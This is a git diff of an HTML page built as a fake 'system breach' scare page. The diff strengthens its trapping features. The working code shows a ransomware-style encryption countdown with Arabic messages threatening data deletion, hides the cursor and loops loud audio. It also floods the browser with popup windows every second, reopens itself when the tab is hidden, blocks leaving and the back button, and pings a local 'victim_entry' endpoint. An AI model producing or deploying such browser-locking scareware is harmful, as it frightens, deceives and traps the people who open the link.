@@ -5,11 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>⚠️ CRITICAL_SYSTEM_FAILURE ⚠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: crosshair; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: none; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
         #clockContainer { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
         #timer { font-size: 120px; font-weight: bold; text-shadow: 0 0 20px #f00; }
-        #warningText { font-size: 18px; margin-top: 20px; letter-spacing: 2px; }
         #textOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.9); padding: 30px; border: 2px solid #f00; display: none; width: 85%; }
         .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
@@ -18,18 +17,18 @@
 <body onclick="initiateSequence()">
 
     <div id="clockContainer">
-        <div id="warningText" class="blink">SYSTEM TERMINATION IN:</div>
+        <div id="warningText" class="blink" style="font-size: 18px;">SYSTEM ENCRYPTION IN:</div>
         <div id="timer">07</div>
-        <p style="color: #444; font-size: 12px;">CLICK TO ABORT...</p>
+        <p style="color: #444; font-size: 12px;">ATTEMPTING TO ABORT...</p>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     <div id="textOverlay" class="blink">
-        <h1 style="font-size: 30px;">TOTAL SYSTEM BREACH</h1>
-        <p style="font-size: 16px; color: #fff;">لقد تم اختراق بروتوكول الحماية بالكامل.</p>
-        <p style="font-size: 14px;">لا تحاول استعادة الملفات، لقد تم تشفير كل شيء.</p>
+        <h1 style="font-size: 30px;">SECURITY BREACH</h1>
+        <p style="font-size: 16px; color: #fff;">تم اختراق النظام.. لا يمكنك الخروج الآن.</p>
+        <p style="font-size: 14px;">محاولات الهروب ستؤدي لحذف كافة البيانات فوراً.</p>
         <hr style="border: 1px solid #f00;">
-        <p style="font-size: 10px;">ROOT_ACCESS: GRANTED | ENCRYPTION: 100%</p>
+        <p style="font-size: 10px;">LOCKED_BY_ALGE-HACKER | STATUS: TRAPPED</p>
     </div>
 
     <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>
@@ -38,20 +37,17 @@
         let running = false;
         let timeLeft = 7;
         const audio = document.getElementById('sfx');
-        const timerDisplay = document.getElementById('timer');
         const MY_LINK = window.location.href;
 
         function initiateSequence() {
             if (running) return;
             running = true;
             
-            // إرسال تنبيه للـ Termux سواسوة
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
 
             let countdown = setInterval(() => {
                 timeLeft--;
-                timerDisplay.innerText = timeLeft < 10 ? "0" + timeLeft : timeLeft;
-                
+                document.getElementById('timer').innerText = timeLeft < 10 ? "0" + timeLeft : timeLeft;
                 if (timeLeft <= 0) {
                     clearInterval(countdown);
                     triggerHorror();
@@ -66,22 +62,40 @@
             
             audio.volume = 1.0;
             audio.play();
-            audio.onended = () => { setTimeout(() => { audio.play(); }, 4000); };
+            audio.onended = () => { setTimeout(() => { if(running) audio.play(); }, 4000); };
 
-            // إغراق المتصفح سواسوة
+            // ميزة الحبس: فتح تبويبات جديدة وإعادة تحميل الصفحة سواسوة
             setInterval(() => {
                 window.open(MY_LINK, '_blank', 'width=10,height=10');
-            }, 1200);
+            }, 1000);
         }
 
-        // منع الهروب سواسوة
+        // ميزة منع الهروب (Anti-Escape) سواسوة
+        window.onbeforeunload = function() {
+            return "هل تريد حقاً المغادرة؟ سيتم مسح بياناتك!";
+        };
+
+        // إجبارية البقاء عند محاولة تغيير التبويب سواسوة
         document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'visible' && running && timeLeft <= 0) {
-                location.reload();
+            if (document.visibilityState === 'hidden' && running) {
+                // إذا حاول يخرج أو يغلق المتصفح، نفتحو رابط جديد فوراً سواسوة
+                window.open(MY_LINK, '_blank');
             }
         });
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
+
+        // منع الرجوع للخلف سواسوة
+        (function(window, location) {
+            history.replaceState(null, document.title, location.pathname + "#!/steer");
+            history.pushState(null, document.title, location.pathname);
+            window.addEventListener("popstate", function() {
+                if(location.hash === "#!/steer") {
+                    history.replaceState(null, document.title, location.pathname);
+                    setTimeout(function(){
+                        location.replace(MY_LINK);
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
     </script>
 </body>
 </html>
